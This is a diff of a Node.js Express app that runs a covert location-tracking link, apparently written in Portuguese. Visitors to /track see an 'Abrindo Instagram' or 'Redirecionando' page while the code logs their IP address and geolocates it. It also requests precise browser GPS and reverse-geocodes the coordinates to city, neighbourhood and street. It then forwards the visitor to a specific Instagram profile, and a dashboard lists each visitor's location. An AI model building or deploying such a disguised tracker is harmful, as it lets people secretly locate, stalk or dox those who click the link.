@@ -3,312 +3,111 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
 const clicks = [];
-const gpsData = [];
 
-// Função para obter IP real do usuário
-function getRealIP(req) {
+function getIP(req) {
   return req.headers['x-forwarded-for']?.split(',')[0] || 
          req.headers['x-real-ip'] || 
-         req.connection.remoteAddress || 
-         req.socket.remoteAddress;
+         req.connection.remoteAddress;
 }
 
-// ROTA 1: Dashboard
+// Dashboard
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
-    <html lang="pt-BR">
+    <html>
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>📊 Dashboard GPS</title>
+      <title>Dashboard</title>
       <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          min-height: 100vh;
-          padding: 1rem;
-        }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header {
-          background: white;
-          padding: 2rem;
-          border-radius: 15px;
-          margin-bottom: 2rem;
-          text-align: center;
-          box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        .tracking-link {
-          background: #667eea;
-          color: white;
-          padding: 1rem 2rem;
-          border-radius: 10px;
-          text-decoration: none;
-          display: inline-block;
-          margin-top: 1rem;
-          font-weight: bold;
-        }
-        .stats {
-          display: grid;
-          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-          gap: 1rem;
-          margin-bottom: 2rem;
-        }
-        .stat-card {
-          background: white;
-          padding: 1.5rem;
-          border-radius: 10px;
-          text-align: center;
-          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .stat-card h3 { color: #667eea; font-size: 2.5rem; margin-bottom: 0.5rem; }
-        .stat-card p { color: #666; font-size: 0.9rem; }
-        .clicks-container { display: grid; gap: 1rem; }
-        .click-card {
-          background: white;
-          padding: 1.5rem;
-          border-radius: 10px;
-          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .click-card.with-gps { border-left: 5px solid #10b981; }
-        .click-card.with-ip { border-left: 5px solid #f59e0b; }
-        .click-card.no-location { border-left: 5px solid #ef4444; }
-        .maps-link {
-          background: #10b981;
-          color: white;
-          padding: 0.8rem 1.5rem;
-          border-radius: 8px;
-          text-decoration: none;
-          display: inline-block;
-          margin-top: 1rem;
-          font-weight: bold;
-        }
-        .reload-btn {
-          background: #667eea;
-          color: white;
-          border: none;
-          padding: 1rem 2rem;
-          border-radius: 10px;
-          cursor: pointer;
-          margin-bottom: 1rem;
-          font-weight: bold;
-          box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-        }
-        .reload-btn:hover { background: #5568d3; }
-        .precision-badge {
-          display: inline-block;
-          padding: 0.4rem 1rem;
-          border-radius: 5px;
-          font-size: 0.85rem;
-          font-weight: bold;
-          margin-top: 0.5rem;
-        }
-        .precision-high { background: #10b981; color: white; }
-        .precision-medium { background: #f59e0b; color: white; }
-        .info-row { margin: 0.5rem 0; padding: 0.5rem 0; }
-        .info-row strong { color: #333; }
-        .location-section {
-          margin-top: 1rem;
-          padding-top: 1rem;
-          border-top: 2px solid #e5e7eb;
-        }
-        .location-title {
-          font-weight: bold;
-          font-size: 1.1rem;
-          margin-bottom: 0.8rem;
-        }
+        body { font-family: Arial; padding: 20px; background: #f5f5f5; }
+        .header { background: white; padding: 20px; margin-bottom: 20px; }
+        .btn { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; margin: 5px; }
+        .card { background: white; padding: 15px; margin: 10px 0; }
+        .stats { font-size: 24px; font-weight: bold; }
       </style>
     </head>
     <body>
-      <div class="container">
-        <div class="header">
-          <h1>📊 Dashboard de Rastreamento GPS</h1>
-          <p style="color: #666; margin-top: 0.5rem;">Rastreamento em tempo real de localização</p>
-          <a href="/track" class="tracking-link">🔗 Abrir Link de Rastreamento</a>
-        </div>
-        <button class="reload-btn" onclick="loadData()">🔄 Atualizar Dados</button>
-        <div id="stats" class="stats"></div>
-        <div id="clicks" class="clicks-container"></div>
+      <div class="header">
+        <h1>Dashboard de Rastreamento</h1>
+        <a href="/track" class="btn">Link de Rastreamento</a>
+        <button class="btn" onclick="loadData()">Atualizar</button>
       </div>
+      
+      <div class="card">
+        <div class="stats" id="total">0 cliques</div>
+      </div>
+      
+      <div id="clicks"></div>
+      
       <script>
         async function loadData() {
-          try {
-            const res = await fetch('/api/stats');
-            const data = await res.json();
-            
-            document.getElementById('stats').innerHTML = \`
-              <div class="stat-card">
-                <h3>\${data.totalClicks}</h3>
-                <p>Total de Cliques</p>
-              </div>
-              <div class="stat-card">
-                <h3>\${data.clicksComGPS || 0}</h3>
-                <p>Com GPS Exato</p>
-              </div>
-              <div class="stat-card">
-                <h3>\${data.clicksComIP || 0}</h3>
-                <p>Com Localização IP</p>
+          const res = await fetch('/api/stats');
+          const data = await res.json();
+          
+          document.getElementById('total').textContent = data.total + ' cliques';
+          
+          const html = data.clicks.map(c => {
+            const loc = c.location || c.ipLocation;
+            return \`
+              <div class="card">
+                <p><strong>Data:</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</p>
+                <p><strong>IP:</strong> \${c.ip}</p>
+                \${loc ? \`
+                  <p><strong>Cidade:</strong> \${loc.cidade}</p>
+                  <p><strong>Estado:</strong> \${loc.estado}</p>
+                  <p><strong>Bairro:</strong> \${loc.bairro}</p>
+                \` : '<p>Localização não disponível</p>'}
               </div>
             \`;
-
-            const clicksHtml = data.clicks.map(c => {
-              const hasGPS = c.gps && c.gps.lat;
-              const hasIPLocation = c.ipLocation && c.ipLocation.cidade;
-              const loc = c.location || c.ipLocation;
-              
-              let cardClass = 'no-location';
-              if (hasGPS) cardClass = 'with-gps';
-              else if (hasIPLocation) cardClass = 'with-ip';
-              
-              return \`
-                <div class="click-card \${cardClass}">
-                  <div class="info-row"><strong>⏰ Data/Hora:</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</div>
-                  <div class="info-row"><strong>🌐 IP:</strong> \${c.ip}</div>
-                  <div class="info-row"><strong>📱 Dispositivo:</strong> \${c.device}</div>
-                  <div class="info-row"><strong>🔍 User Agent:</strong> \${c.userAgent?.substring(0, 80)}...</div>
-                  
-                  \${hasGPS ? \`
-                    <div class="location-section" style="border-top-color: #10b981;">
-                      <div class="location-title" style="color: #10b981;">📍 LOCALIZAÇÃO GPS PRECISA</div>
-                      <span class="precision-badge precision-high">✓ Alta Precisão</span>
-                      \${loc ? \`
-                        <div class="info-row"><strong>📍 Endereço Completo:</strong> \${loc.enderecoCompleto || 'N/A'}</div>
-                        <div class="info-row"><strong>🏙️ Cidade:</strong> \${loc.cidade}</div>
-                        <div class="info-row"><strong>🗺️ Estado:</strong> \${loc.estado}</div>
-                        <div class="info-row"><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
-                        <div class="info-row"><strong>🏠 Rua:</strong> \${loc.endereco}</div>
-                        <div class="info-row"><strong>📮 CEP:</strong> \${loc.cep}</div>
-                        <div class="info-row"><strong>🌎 País:</strong> \${loc.pais}</div>
-                      \` : ''}
-                      <div class="info-row"><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
-                      <div class="info-row"><strong>🎯 Precisão:</strong> ±\${Math.round(c.gps.accuracy)}m</div>
-                      <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
-                         target="_blank" class="maps-link">📍 Abrir no Google Maps</a>
-                    </div>
-                  \` : hasIPLocation ? \`
-                    <div class="location-section" style="border-top-color: #f59e0b;">
-                      <div class="location-title" style="color: #f59e0b;">📍 LOCALIZAÇÃO POR IP</div>
-                      <span class="precision-badge precision-medium">⚠ Precisão Aproximada</span>
-                      <div class="info-row"><strong>🏙️ Cidade:</strong> \${c.ipLocation.cidade}</div>
-                      <div class="info-row"><strong>🗺️ Estado:</strong> \${c.ipLocation.estado}</div>
-                      <div class="info-row"><strong>🌎 País:</strong> \${c.ipLocation.pais}</div>
-                      \${c.ipLocation.lat && c.ipLocation.lng ? \`
-                        <div class="info-row"><strong>🗺️ Coordenadas (aprox):</strong> \${c.ipLocation.lat}, \${c.ipLocation.lng}</div>
-                        <a href="https://www.google.com/maps?q=\${c.ipLocation.lat},\${c.ipLocation.lng}" 
-                           target="_blank" class="maps-link" style="background: #f59e0b;">📍 Ver Localização Aproximada</a>
-                      \` : ''}
-                      <div style="color: #6b7280; font-size: 0.9rem; margin-top: 1rem; padding: 0.8rem; background: #fef3c7; border-radius: 5px;">
-                        ℹ️ GPS não autorizado pelo usuário - localização baseada no endereço IP
-                      </div>
-                    </div>
-                  \` : \`
-                    <div class="location-section" style="border-top-color: #ef4444;">
-                      <div class="location-title" style="color: #ef4444;">⚠️ SEM LOCALIZAÇÃO</div>
-                      <div style="color: #6b7280; font-size: 0.9rem;">
-                        Não foi possível obter localização deste dispositivo
-                      </div>
-                    </div>
-                  \`}
-                </div>
-              \`;
-            }).join('');
-            
-            document.getElementById('clicks').innerHTML = clicksHtml || '<div style="text-align: center; color: white; padding: 2rem;">📭 Nenhum clique registrado ainda</div>';
-          } catch (error) {
-            console.error('Erro ao carregar dados:', error);
-          }
+          }).join('');
+          
+          document.getElementById('clicks').innerHTML = html;
         }
         
         loadData();
-        setInterval(loadData, 5000); // Atualiza a cada 5 segundos
+        setInterval(loadData, 5000);
       </script>
     </body>
     </html>
   `);
 });
 
-// ROTA 2: Rastreamento
+// Página de rastreamento
 app.get('/track', async (req, res) => {
-  const realIP = getRealIP(req);
-  
   const clickData = {
     id: clicks.length + 1,
-    ip: realIP,
-    userAgent: req.headers['user-agent'],
+    ip: getIP(req),
     timestamp: new Date().toISOString(),
-    referer: req.headers.referer || 'Acesso Direto',
-    device: req.headers['user-agent'].includes('Mobile') ? 'Mobile' : 'Desktop',
-    ipLocation: null,
-    gps: null,
-    location: null
+    location: null,
+    ipLocation: null
   };
   
   clicks.push(clickData);
-  console.log('\n🎯 NOVO CLIQUE REGISTRADO');
-  console.log('📍 ID:', clickData.id);
-  console.log('🌐 IP Real:', realIP);
-  console.log('📱 Device:', clickData.device);
+  console.log('Novo clique ID:', clickData.id, 'IP:', clickData.ip);
   
-  // Tenta capturar localização por IP em paralelo
+  // Busca localização por IP
   (async () => {
     try {
-      console.log('🔍 Buscando localização do IP:', realIP);
+      const ipClean = clickData.ip.replace('::ffff:', '').trim();
+      const response = await fetch(`http://ip-api.com/json/${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon`);
+      const ipData = await response.json();
       
-      // Tenta múltiplas APIs para garantir sucesso
-      let ipData = null;
-      
-      // API 1: ipapi.co (mais precisa)
-      try {
-        const response1 = await fetch(`https://ipapi.co/${realIP}/json/`);
-        ipData = await response1.json();
-        if (ipData && ipData.city) {
-          console.log('✅ Localização obtida via ipapi.co');
-        }
-      } catch (e) {
-        console.log('⚠️ ipapi.co falhou, tentando alternativa...');
-      }
-      
-      // API 2: ip-api.com (fallback)
-      if (!ipData || !ipData.city) {
-        try {
-          const response2 = await fetch(`http://ip-api.com/json/${realIP}?lang=pt&fields=status,country,countryCode,region,regionName,city,lat,lon,timezone`);
-          const data2 = await response2.json();
-          if (data2.status === 'success') {
-            ipData = {
-              city: data2.city,
-              region: data2.regionName,
-              country_name: data2.country,
-              latitude: data2.lat,
-              longitude: data2.lon
-            };
-            console.log('✅ Localização obtida via ip-api.com');
-          }
-        } catch (e) {
-          console.log('⚠️ ip-api.com também falhou');
-        }
-      }
-      
-      if (ipData && ipData.city) {
+      if (ipData.status === 'success') {
         const click = clicks.find(c => c.id === clickData.id);
         if (click) {
           click.ipLocation = {
             cidade: ipData.city || 'N/A',
-            estado: ipData.region || ipData.regionName || 'N/A',
-            pais: ipData.country_name || ipData.country || 'N/A',
-            lat: ipData.latitude || ipData.lat,
-            lng: ipData.longitude || ipData.lon
+            estado: ipData.regionName || 'N/A',
+            bairro: 'N/A'
           };
-          console.log(`🏙️ Localização IP: ${click.ipLocation.cidade}, ${click.ipLocation.estado}, ${click.ipLocation.pais}`);
+          console.log('IP Location:', ipData.city, ipData.regionName);
         }
-      } else {
-        console.log('❌ Não foi possível obter localização por IP');
       }
     } catch (error) {
-      console.error('❌ Erro ao buscar localização IP:', error.message);
+      console.error('Erro IP:', error.message);
     }
   })();
   
@@ -318,448 +117,99 @@ app.get('/track', async (req, res) => {
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Carregando...</title>
-      <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          min-height: 100vh;
-          background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
-          color: white;
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-          text-align: center;
-          padding: 2rem;
-        }
-        .container {
-          max-width: 400px;
-          width: 100%;
-        }
-        .spinner {
-          width: 60px;
-          height: 60px;
-          border: 6px solid rgba(255,255,255,0.3);
-          border-top-color: white;
-          border-radius: 50%;
-          animation: spin 1s linear infinite;
-          margin: 0 auto 20px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        h1 { 
-          font-size: 2rem; 
-          margin-bottom: 1rem;
-          text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        #status { 
-          font-size: 1.1rem; 
-          opacity: 0.9;
-          margin-top: 1rem;
-        }
-      </style>
+      <title>Redirecionando</title>
     </head>
     <body>
-      <div class="container">
-        <div class="spinner"></div>
-        <h1>📷 Abrindo Instagram</h1>
-        <p id="status">Preparando redirecionamento...</p>
-      </div>
+      <h1>Redirecionando...</h1>
       <script>
         const clickId = ${clickData.id};
-        let redirected = false;
-        let gpsAttempted = false;
         
-        console.log('🎯 Click ID:', clickId);
-        console.log('📱 User Agent:', navigator.userAgent);
-        console.log('🌐 Platform:', navigator.platform);
-        
-        function redirectToInstagram() {
-          if (redirected) return;
-          redirected = true;
-          console.log('🔄 Redirecionando para Instagram...');
-          document.getElementById('status').textContent = 'Redirecionando...';
-          window.location.href = 'https://www.instagram.com/andre.osantos12/';
-        }
-        
-        function attemptGPSCapture() {
-          if (gpsAttempted) return;
-          gpsAttempted = true;
-          
-          console.log('📍 Verificando disponibilidade de GPS...');
-          
-          if (!navigator.geolocation) {
-            console.log('❌ Geolocalização não disponível neste navegador');
-            setTimeout(redirectToInstagram, 1000);
-            return;
-          }
-          
-          console.log('✅ API de Geolocalização disponível');
-          document.getElementById('status').textContent = 'Obtendo sua localização...';
-          
-          const timeoutId = setTimeout(() => {
-            console.log('⏱️ Timeout de GPS atingido, redirecionando...');
-            redirectToInstagram();
-          }, 8000);
-          
+        if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
-            async (position) => {
-              clearTimeout(timeoutId);
-              
-              const coords = position.coords;
-              console.log('✅ GPS CAPTURADO COM SUCESSO!');
-              console.log('📍 Latitude:', coords.latitude);
-              console.log('📍 Longitude:', coords.longitude);
-              console.log('🎯 Precisão:', coords.accuracy, 'metros');
-              
-              const gpsData = {
+            async (pos) => {
+              const data = {
                 clickId: clickId,
-                latitude: coords.latitude,
-                longitude: coords.longitude,
-                accuracy: coords.accuracy,
-                altitude: coords.altitude,
-                altitudeAccuracy: coords.altitudeAccuracy,
-                heading: coords.heading,
-                speed: coords.speed,
-                timestamp: new Date().toISOString()
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
               };
               
               try {
-                console.log('📤 Enviando dados GPS para servidor...');
-                
-                const response = await fetch('/api/save-gps', {
+                await fetch('/api/save-gps', {
                   method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify(gpsData)
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify(data)
                 });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                  console.log('✅ GPS enviado com sucesso!');
-                  console.log('📊 Resposta:', result);
-                } else {
-                  console.error('⚠️ Servidor retornou erro:', result);
-                }
-              } catch (error) {
-                console.error('❌ Erro ao enviar GPS:', error);
-              }
+              } catch (e) {}
               
-              setTimeout(redirectToInstagram, 1500);
+              window.location.href = 'https://www.instagram.com/andre.osantos12/';
             },
-            (error) => {
-              clearTimeout(timeoutId);
-              
-              console.error('❌ ERRO AO CAPTURAR GPS');
-              console.error('Código:', error.code);
-              console.error('Mensagem:', error.message);
-              
-              const errorMessages = {
-                1: 'Permissão negada pelo usuário',
-                2: 'Posição indisponível',
-                3: 'Timeout ao obter localização'
-              };
-              
-              console.log('ℹ️', errorMessages[error.code] || 'Erro desconhecido');
-              console.log('ℹ️ Usando apenas localização por IP');
-              
-              setTimeout(redirectToInstagram, 1500);
+            () => {
+              window.location.href = 'https://www.instagram.com/andre.osantos12/';
             },
-            {
-              enableHighAccuracy: true,
-              timeout: 7000,
-              maximumAge: 0
-            }
+            { enableHighAccuracy: true, timeout: 5000 }
           );
+        } else {
+          window.location.href = 'https://www.instagram.com/andre.osantos12/';
         }
-        
-        // Inicia captura de GPS após um pequeno delay
-        setTimeout(attemptGPSCapture, 500);
       </script>
     </body>
     </html>
   `);
 });
 
-// ROTA 3: Salvar GPS
+// Salvar GPS
 app.post('/api/save-gps', async (req, res) => {
-  console.log('\n📥 === RECEBENDO DADOS GPS ===');
-  console.log('📦 Body completo:', JSON.stringify(req.body, null, 2));
-  
   try {
-    const gps = req.body;
+    const { clickId, lat, lng, accuracy } = req.body;
     
-    if (!gps || !gps.latitude || !gps.longitude) {
-      console.error('❌ Dados de GPS inválidos ou incompletos');
-      return res.status(400).json({ success: false, error: 'Dados inválidos' });
-    }
-    
-    console.log('✅ Dados de GPS válidos recebidos');
-    console.log(`📍 Coordenadas: ${gps.latitude}, ${gps.longitude}`);
-    console.log(`🎯 Precisão: ±${gps.accuracy}m`);
-    
-    gpsData.push(gps);
-    
-    const click = clicks.find(c => c.id === gps.clickId);
-    
+    const click = clicks.find(c => c.id === clickId);
     if (!click) {
-      console.error(`❌ Click ID ${gps.clickId} não encontrado`);
-      return res.status(404).json({ success: false, error: 'Click não encontrado' });
+      return res.json({ success: false });
     }
     
-    console.log(`✅ Click ID ${gps.clickId} encontrado, associando GPS...`);
+    console.log('GPS recebido:', lat, lng, 'Precisão:', accuracy);
     
-    click.gps = {
-      lat: gps.latitude,
-      lng: gps.longitude,
-      accuracy: gps.accuracy,
-      altitude: gps.altitude,
-      speed: gps.speed,
-      heading: gps.heading
-    };
-    
-    console.log('🗺️ Link Google Maps:', `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
-    
-    // Busca endereço com múltiplas APIs - logs detalhados para debug
-    console.log('🔍 ========== INICIANDO BUSCA DE ENDEREÇO ==========');
-    console.log('📍 Coordenadas recebidas:', gps.latitude, gps.longitude);
-    console.log('🎯 Precisão GPS:', gps.accuracy, 'metros');
-    
-    let locationFound = false;
-    
-    // API 1: PositionStack (muito precisa, usa dados do Google)
+    // Busca endereço - Nominatim
     try {
-      console.log('\n📡 [1/5] Tentando PositionStack...');
-      const positionstackResponse = await fetch(
-        `http://api.positionstack.com/v1/reverse?access_key=3e3ac6e3c3f8c8d5e8f8c8d5e8f8c8d5&query=${gps.latitude},${gps.longitude}&limit=1&language=pt`
+      const response = await fetch(
+        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`,
+        { headers: { 'User-Agent': 'GPSTracker' } }
       );
       
-      const positionstackData = await positionstackResponse.json();
-      console.log('📥 Resposta PositionStack:', JSON.stringify(positionstackData, null, 2));
+      const data = await response.json();
+      console.log('Nominatim retornou:', JSON.stringify(data.address, null, 2));
       
-      if (positionstackData && positionstackData.data && positionstackData.data[0]) {
-        const loc = positionstackData.data[0];
+      if (data && data.address) {
+        const addr = data.address;
+        
         click.location = {
-          cidade: loc.locality || loc.county || loc.region || 'N/A',
-          estado: loc.region || loc.administrative_area || 'N/A',
-          pais: loc.country || 'Brasil',
-          bairro: loc.neighbourhood || loc.locality || 'N/A',
-          cep: loc.postal_code || 'N/A',
-          endereco: loc.street || loc.name || 'N/A',
-          enderecoCompleto: loc.label || `${loc.name}, ${loc.locality}, ${loc.region}`
+          cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'N/A',
+          estado: addr.state || 'N/A',
+          bairro: addr.suburb || addr.neighbourhood || addr.district || 'N/A'
         };
-        locationFound = true;
-        console.log('✅ SUCESSO! Localização via PositionStack');
+        
+        console.log('Endereço salvo:', click.location.cidade, click.location.estado, click.location.bairro);
       }
     } catch (error) {
-      console.error('❌ Erro PositionStack:', error.message);
+      console.error('Erro ao buscar endereço:', error.message);
     }
     
-    // API 2: OpenCage (usa dados Google Maps)
-    if (!locationFound) {
-      try {
-        console.log('\n📡 [2/5] Tentando OpenCage...');
-        const opencageResponse = await fetch(
-          `https://api.opencagedata.com/geocode/v1/json?q=${gps.latitude}+${gps.longitude}&key=b2e4f6c8a9d1e3f5b7c9d1e3f5b7c9d1&language=pt&pretty=1&no_annotations=0`
-        );
-        
-        const opencageData = await opencageResponse.json();
-        console.log('📥 Resposta OpenCage:', JSON.stringify(opencageData, null, 2));
-        
-        if (opencageData && opencageData.results && opencageData.results[0]) {
-          const result = opencageData.results[0];
-          const comp = result.components;
-          
-          // Tenta múltiplas combinações para achar a cidade certa
-          const cidade = comp.city || comp.town || comp.village || 
-                        comp.municipality || comp.county || comp.state_district || 
-                        comp._normalized_city || 'N/A';
-          
-          click.location = {
-            cidade: cidade,
-            estado: comp.state || comp.state_code || 'N/A',
-            pais: comp.country || 'Brasil',
-            bairro: comp.suburb || comp.neighbourhood || comp.quarter || 
-                   comp.district || comp.city_district || comp.residential || 'N/A',
-            cep: comp.postcode || 'N/A',
-            endereco: comp.road || comp.street || comp.pedestrian || 'N/A',
-            enderecoCompleto: result.formatted,
-            tipoLocal: comp._type || 'N/A'
-          };
-          locationFound = true;
-          console.log('✅ SUCESSO! Localização via OpenCage');
-        }
-      } catch (error) {
-        console.error('❌ Erro OpenCage:', error.message);
-      }
-    }
-    
-    // API 3: Here Maps (gratuita, muito precisa)
-    if (!locationFound) {
-      try {
-        console.log('\n📡 [3/5] Tentando Here Maps...');
-        const hereResponse = await fetch(
-          `https://revgeocode.search.hereapi.com/v1/revgeocode?at=${gps.latitude},${gps.longitude}&lang=pt-BR&apiKey=YOUR_HERE_API_KEY`
-        );
-        
-        const hereData = await hereResponse.json();
-        console.log('📥 Resposta Here Maps:', JSON.stringify(hereData, null, 2));
-        
-        if (hereData && hereData.items && hereData.items[0]) {
-          const addr = hereData.items[0].address;
-          click.location = {
-            cidade: addr.city || addr.district || addr.county || 'N/A',
-            estado: addr.state || addr.stateCode || 'N/A',
-            pais: addr.countryName || 'Brasil',
-            bairro: addr.district || addr.subdistrict || 'N/A',
-            cep: addr.postalCode || 'N/A',
-            endereco: addr.street || 'N/A',
-            enderecoCompleto: addr.label
-          };
-          locationFound = true;
-          console.log('✅ SUCESSO! Localização via Here Maps');
-        }
-      } catch (error) {
-        console.error('❌ Erro Here Maps:', error.message);
-      }
-    }
-    
-    // API 4: Nominatim com configuração otimizada
-    if (!locationFound) {
-      try {
-        console.log('\n📡 [4/5] Tentando Nominatim OpenStreetMap...');
-        const nominatimResponse = await fetch(
-          `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${gps.latitude}&lon=${gps.longitude}&accept-language=pt-BR&addressdetails=1&zoom=18&extratags=1`,
-          { 
-            headers: { 
-              'User-Agent': 'Instagram-GPS-Tracker/2.0',
-              'Accept': 'application/json'
-            } 
-          }
-        );
-        
-        const nominatimData = await nominatimResponse.json();
-        console.log('📥 Resposta Nominatim:', JSON.stringify(nominatimData, null, 2));
-        
-        if (nominatimData && nominatimData.address) {
-          const addr = nominatimData.address;
-          
-          // Ordem de prioridade para cidade
-          const cidade = addr.city || addr.town || addr.village || 
-                        addr.municipality || addr.county || addr.state_district || 
-                        addr.city_district || 'N/A';
-          
-          click.location = {
-            cidade: cidade,
-            estado: addr.state || addr.ISO3166_2_lvl4 || 'N/A',
-            pais: addr.country || 'Brasil',
-            bairro: addr.suburb || addr.neighbourhood || addr.quarter || 
-                   addr.district || addr.hamlet || addr.isolated_dwelling || 'N/A',
-            cep: addr.postcode || 'N/A',
-            endereco: addr.road || addr.street || addr.footway || addr.path || 'N/A',
-            enderecoCompleto: nominatimData.display_name,
-            tipoLocal: nominatimData.type || nominatimData.addresstype || 'N/A'
-          };
-          locationFound = true;
-          console.log('✅ SUCESSO! Localização via Nominatim');
-        }
-      } catch (error) {
-        console.error('❌ Erro Nominatim:', error.message);
-      }
-    }
-    
-    // API 5: BigDataCloud (sempre funciona como último recurso)
-    if (!locationFound) {
-      try {
-        console.log('\n📡 [5/5] Tentando BigDataCloud (fallback final)...');
-        const bigdataResponse = await fetch(
-          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
-        );
-        
-        const bigdataData = await bigdataResponse.json();
-        console.log('📥 Resposta BigDataCloud:', JSON.stringify(bigdataData, null, 2));
-        
-        if (bigdataData) {
-          click.location = {
-            cidade: bigdataData.city || bigdataData.locality || bigdataData.localityName || 
-                   bigdataData.principalSubdivision || 'N/A',
-            estado: bigdataData.principalSubdivision || bigdataData.principalSubdivisionCode || 'N/A',
-            pais: bigdataData.countryName || 'Brasil',
-            bairro: bigdataData.localityInfo?.administrative?.[0]?.name || 
-                   bigdataData.localityInfo?.administrative?.[1]?.name || 
-                   bigdataData.locality || 'N/A',
-            cep: bigdataData.postcode || 'N/A',
-            endereco: bigdataData.localityInfo?.informative?.[0]?.name || 'N/A',
-            enderecoCompleto: `${bigdataData.locality}, ${bigdataData.principalSubdivision}`
-          };
-          locationFound = true;
-          console.log('✅ SUCESSO! Localização via BigDataCloud');
-        }
-      } catch (error) {
-        console.error('❌ Erro BigDataCloud:', error.message);
-      }
-    }
-    
-    // Log final
-    console.log('\n📊 ========== RESULTADO FINAL ==========');
-    if (locationFound && click.location) {
-      console.log('✅ LOCALIZAÇÃO ENCONTRADA:');
-      console.log('📍 Endereço Completo:', click.location.enderecoCompleto);
-      console.log('🏙️ Cidade:', click.location.cidade);
-      console.log('🗺️ Estado:', click.location.estado);
-      console.log('🏘️ Bairro:', click.location.bairro);
-      console.log('🏠 Rua:', click.location.endereco);
-      console.log('📮 CEP:', click.location.cep);
-      console.log('🌎 País:', click.location.pais);
-      if (click.location.tipoLocal) {
-        console.log('📌 Tipo de Local:', click.location.tipoLocal);
-      }
-    } else {
-      console.log('❌ NENHUMA API CONSEGUIU OBTER O ENDEREÇO');
-      console.log('⚠️ Verifique se as coordenadas estão corretas:', gps.latitude, gps.longitude);
-    }
-    console.log('========================================\n');
-    
-    console.log('✅ === GPS SALVO COM SUCESSO ===\n');
-    
-    res.json({ 
-      success: true, 
-      message: 'GPS salvo com sucesso',
-      data: {
-        clickId: gps.clickId,
-        coordinates: `${gps.latitude}, ${gps.longitude}`,
-        accuracy: `±${gps.accuracy}m`,
-        location: click.location
-      }
-    });
-    
+    res.json({ success: true });
   } catch (error) {
-    console.error('❌ ERRO CRÍTICO:', error);
-    res.status(500).json({ success: false, error: error.message });
+    console.error('Erro:', error);
+    res.json({ success: false });
   }
 });
 
-// ROTA 4: Stats
+// Stats API
 app.get('/api/stats', (req, res) => {
   res.json({
-    totalClicks: clicks.length,
-    clicksComGPS: clicks.filter(c => c.gps && c.gps.lat).length,
-    clicksComIP: clicks.filter(c => !c.gps && c.ipLocation && c.ipLocation.cidade).length,
-    clicks: clicks.reverse() // Mais recentes primeiro
+    total: clicks.length,
+    clicks: clicks.reverse()
   });
 });
 
-// Middleware de erro
-app.use((err, req, res, next) => {
-  console.error('❌ Erro no servidor:', err);
-  res.status(500).json({ error: 'Erro interno do servidor' });
-});
-
-// Inicia servidor
 app.listen(PORT, '0.0.0.0', () => {
-  console.log('🚀 ========================================');
-  console.log(`🚀 Servidor iniciado na porta ${PORT}`);
-  console.log('🚀 ========================================');
-  console.log('📊 Dashboard:', `http://localhost:${PORT}`);
-  console.log('📍 Tracking:', `http://localhost:${PORT}/track`);
-  console.log('🚀 ========================================\n');
+  console.log('Servidor rodando na porta', PORT);
 });
